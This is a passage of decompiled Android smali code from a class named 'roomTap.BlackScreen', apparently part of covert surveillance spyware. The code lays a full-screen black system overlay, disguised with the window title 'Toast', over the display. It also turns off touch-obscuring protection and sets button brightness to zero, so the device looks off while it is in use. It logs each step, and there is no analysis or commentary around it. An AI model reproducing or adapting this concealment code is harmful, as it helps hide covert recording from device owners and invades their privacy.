    invoke-virtual {v0, v1}, Landroid/view/View;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    const/4 v0, 0x1

    :try_start_4
    new-array v0, v0, [Ljava/lang/Class;

    const/4 v1, 0x0

    sget-object v2, Ljava/lang/Boolean;->TYPE:Ljava/lang/Class;

    aput-object v2, v0, v1

    const-class v1, Landroid/view/View;

    const-string v2, "setFilterTouchesWhenObscured"

    invoke-virtual {v1, v2, v0}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_4

    :goto_2
    :try_start_5
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const/4 v1, -0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->height:I

    const/4 v1, -0x1

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->width:I

    const/16 v1, 0x118

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->flags:I

    const/4 v1, -0x3

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->format:I

    const/16 v1, 0x7d6

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->type:I

    const-string v1, "Toast"

    invoke-virtual {v0, v1}, Landroid/view/WindowManager$LayoutParams;->setTitle(Ljava/lang/CharSequence;)V

    const/16 v1, 0x77

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    const/4 v1, 0x0

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->x:I

    const/4 v1, 0x0

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->y:I

    const/high16 v1, 0x3f800000    # 1.0f

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->verticalWeight:F

    const/high16 v1, 0x3f800000    # 1.0f

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->horizontalWeight:F

    const/4 v1, 0x0

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->verticalMargin:F

    const/4 v1, 0x0

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->horizontalMargin:F

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    sget-object v2, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-interface {v1, v2, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z

    const-string v0, "BlackScreen createBlackFilter finished successfuly "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :try_start_6
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen createBlackFilter exception: ."

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->b(Ljava/lang/String;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v0}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const-class v1, Landroid/view/WindowManager$LayoutParams;

    const-string v2, "buttonBrightness"

    invoke-virtual {v1, v2}, Ljava/lang/Class;->getField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V

    sget-object v1, Lcom/network/android/roomTap/BlackScreen;->f:Landroid/view/WindowManager;

    sget-object v2, Lcom/network/android/roomTap/BlackScreen;->e:Landroid/view/View;

    invoke-interface {v1, v2, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/roomTap/BlackScreen;->a:Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_2

    goto/16 :goto_0

    :catch_1
    move-exception v0

    :try_start_7
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen createBlackFilter !inside the catch! exception "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2

    goto/16 :goto_0

    :catch_2
    move-exception v0

    :try_start_8
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen createBlackFilter  exception "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_3

    goto/16 :goto_0

    :catch_3
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen onCreateException"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1

    :catch_4
    move-exception v0

    :try_start_9
    const-string v1, "BlackScreen setFilterTouchesWhenObscured doesn\'t exists. contiuing anyway."

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_2

    goto/16 :goto_2
.end method

.method protected onDestroy()V
    .locals 3

    const-string v0, "BlackScreen onDestroy"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    iget-object v0, p0, Lcom/network/android/roomTap/BlackScreen;->g:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/network/android/roomTap/BlackScreen;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const-string v0, "BlackScreen onDestroy unrgistered broadcastReciever"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BlackScreen onDestroy"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
